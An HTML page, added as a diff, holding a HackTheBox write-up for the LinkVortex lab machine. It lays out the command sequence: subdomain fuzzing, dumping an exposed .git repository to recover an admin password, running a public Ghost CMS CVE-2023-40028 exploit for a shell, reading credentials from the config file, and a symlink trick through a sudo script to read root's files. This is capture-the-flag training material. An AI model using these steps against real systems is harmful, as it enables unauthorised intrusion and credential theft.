@@ -1,0 +1,253 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Linkvortex</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>LinkVortex (HTB – Easy)</h1>
+
+<p>
+The machine hosts a Ghost CMS instance on the main domain and a development subdomain exposing a full <code>.git</code>
+repository. Dumping the repository reveals credentials for the Ghost admin panel.  
+A public Ghost CMS vulnerability (CVE‑2023‑40028) provides RCE.  
+Privilege escalation is achieved through a symlink abuse in a sudo‑controlled cleanup script.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: linkvortex.htb  
+<br>Initial vector: exposed <code>.git</code> directory → credential leak  
+<br>Privilege escalation: insecure symlink handling in sudo script  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Robots.txt:</p>
+<pre>
+/p/
+/r/
+/email/
+/sitemap/
+</pre>
+
+<p>
+Wappalyzer and WhatWeb identify the CMS:
+</p>
+
+<pre>
+Ghost CMS 5.58
+</pre>
+
+<p>
+Directory fuzzing on the main domain reveals nothing useful.
+</p>
+
+<h2>Subdomain Discovery</h2>
+
+<p>Fuzz virtual hosts:</p>
+<pre>
+$ ffuf -u http://linkvortex.htb/ -H "Host: FUZZ.linkvortex.htb" \
+  -w /usr/share/wordlists/dirb/common.txt -fc 301
+-> dev.linkvortex.htb
+</pre>
+
+<p>
+Fuzzing the dev subdomain:
+</p>
+
+<pre>
+$ ffuf -u http://dev.linkvortex.htb/FUZZ \
+  -w /usr/share/wordlists/dirb/common.txt -fc 301
+-> .git/HEAD (200)
+</pre>
+
+<p>
+The <code>.git</code> directory is fully exposed.
+</p>
+
+<h2>Dumping the Git Repository</h2>
+
+<p>Using git-dumper:</p>
+<pre>
+$ python3 git_dumper.py http://dev.linkvortex.htb ./GIT-DUMPER
+</pre>
+
+<p>
+Search for credentials:
+</p>
+
+<pre>
+$ grep -r "password" .
+-> OctopiFociPilfer45
+</pre>
+
+<p>
+Try logging into Ghost admin:
+</p>
+
+<pre>
+http://linkvortex.htb/ghost
+user: admin@linkvortex.htb
+pass: OctopiFociPilfer45
+</pre>
+
+<h2>Ghost CMS RCE (CVE‑2023‑40028)</h2>
+
+<p>
+Use the public exploit:
+</p>
+
+<pre>
+https://github.com/0xyassine/CVE-2023-40028
+</pre>
+
+<p>Run it:</p>
+<pre>
+$ ./exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+-> RCE shell
+</pre>
+
+<p>
+From the shell, inspect the Ghost configuration:
+</p>
+
+<pre>
+/var/lib/ghost/config.production.json
+</pre>
+
+<p>
+Credentials found inside:
+</p>
+
+<pre>
+"user": "bob@linkvortex.htb",
+"pass": "fibber-talented-worth"
+</pre>
+
+<p>SSH as bob:</p>
+<pre>
+$ ssh bob@linkvortex.htb
+</pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>Check sudo permissions:</p>
+<pre>
+$ sudo -l
+-> allowed to run /opt/ghost/clean_symlink.sh with CHECK_CONTENT=true
+</pre>
+
+<p>
+The script follows symlinks and reads files, allowing arbitrary file read as root.
+</p>
+
+<p>Exploit:</p>
+<pre>
+$ ln -s /root/root.txt /home/bob/f1.txt
+$ ln -s /home/bob/f1.txt /home/bob/f1.png
+$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/f1.png
+</pre>
+
+<p>
+The script prints the contents of <code>/root/root.txt</code>.
+</p>
+
+<h2>Notes</h2>
+<p>
+The machine is intentionally brittle:  
+<ul>
+  <li>Git dumpers may miss files unless using the right tool.</li>
+  <li>The symlink exploit only works in <code>/home/bob</code>, not <code>/tmp</code> or <code>/dev/shm</code>.</li>
+  <li>You must know the flag filename (<code>root.txt</code>) to retrieve it.</li>
+</ul>
+</p>
+
+<h2>Conclusion</h2>
+<p>
+LinkVortex relies on an exposed <code>.git</code> directory to leak admin credentials, followed by Ghost CMS RCE
+and a symlink‑based privilege escalation.  
+Once the cleanup script is abused, full system compromise is achieved.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
